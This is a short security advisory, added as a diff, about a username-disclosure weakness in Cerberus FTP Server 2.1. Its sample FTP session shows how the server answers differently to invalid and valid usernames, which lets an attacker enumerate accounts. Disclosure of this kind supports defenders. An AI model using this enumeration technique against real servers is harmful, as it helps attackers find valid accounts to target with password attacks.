@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/7369/info
+
+It has been reported that Cerberus FTP Server is prone to an information disclosure weakness.
+
+The problem exists in the way the FTP server handles the authentication procedure. An attacker may exploit a weakness in error handling to disclose valid usernames.
+
+It should be noted that although this weakness was reported to affect Cerberus FTP server version 2.1, previous versions might also be affected.
+
+c:\ ftp www.example.com
+User (X.X.X.X:(none)): Not_Valid_User
+530 Unknown user
+***
+Login failed.
+Valid User ( The Username Is Hack )
+----------
+c:\ ftp www.example.com
+User (X.X.X.X:(none)): Hack
+331 User Hack Ok, password please
+***
+Password: 
